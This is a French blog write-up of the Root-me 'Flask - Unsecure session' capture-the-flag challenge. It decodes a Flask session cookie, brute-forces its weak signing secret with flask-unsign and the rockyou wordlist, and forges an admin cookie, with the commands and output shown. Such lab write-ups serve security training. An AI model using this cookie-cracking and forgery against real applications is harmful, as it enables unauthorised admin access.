---
title: Root-me - Flask - Unsecure session
meta_title: ""
description: 
date: 2024-06-07T05:00:00Z
image: /images/rootme_logo.png
categories:
  - WebServeur
  - Facile
author: Tmax
tags:
  - WebServeur
  - Rootme
  - Flask
draft: false
---

# Introduction

Pour ce challenge, nous allons devoir prendre en main une application Flask. 

{{< tabs >}} {{< tab "Niveau 1" >}}
- Vous avez bien lu la description du challenge ? Les ressources également ?
- Vous avez décodé les informations de session ? 
- Vous avez compris à quoi sert la clef secrète ?
- Peut-être qu'il existe un outil pour faire ce que vous voulez faire ? 

{{< /tab >}}

{{< tab "Niveau 2" >}}

Le cookie est sous cette forme : eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Zo1FKA.l5WEGjNjBSTUElktRQjhYKc2CpY

Avec Flask, le cookie est généralement sous la forme {base64_data}.{hmac256_hash_data}. 

Si l'on essaye de décoder la data avec un outil comme cyberchef, nous pouvons remarquer qu'elle ressemble à cela : 

```json
{
    "admin": "false",
    "username": "guest"
}
```

Le bût est d’accéder à la page admin, qui vérifie si l'utilisateur est admin au travers du cookie. 

Nous devons générer un cookie avec `admin = true`, sans connaitre la clef secrète qui génère cette signature 

Donc ici ce que l'on recherche c'est de trouver le bon secret afin de dériver `data` et avoir une signature valide. 

Nous pouvons sois générer ce hash à la main et tester la validité de notre cookie avec un script, soit utiliser un outil qui le fait déjà comme `flask-unsign`. Après l'avoir installé : 

```bash
/home/tmax/.local/bin/flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Zo1TTA.IKXFGkrCjhnNIvJHTYtCuDOVJh0'  --no-literal-eval
[*] Session decodes to: {'admin': 'false', 'username': 'guest'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 70144 attempts
b's3cr3t'
```

Nous pouvons maintenant, avec cette clef, générer un cookie valable : 

```bash
/home/tmax/.local/bin/flask-unsign --sign --cookie '{"admin": "true","username": "guest"}' --secret s3cr3t
eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Zo1UIQ.ZWPJM0K9zPnjEc8RlKqbjPuE6E0
```

{{< /tab >}}
{{< /tabs >}}
